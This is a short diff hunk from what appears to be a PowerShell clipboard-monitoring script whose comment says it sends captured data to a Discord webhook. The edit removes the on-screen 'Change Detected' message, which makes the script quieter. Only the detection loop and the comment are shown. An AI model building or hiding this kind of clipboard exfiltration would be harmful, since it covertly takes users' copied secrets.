@@ -12,7 +12,6 @@ while($true)
 
 	if ($currentClipboard -ne $PreviousClipboard) 
     	{
-        	Write-Host "Change Detected"
 		$PreviousClipboard = $currentClipboard
 
 		#Discord webhook send code from I-Am-Jakoby
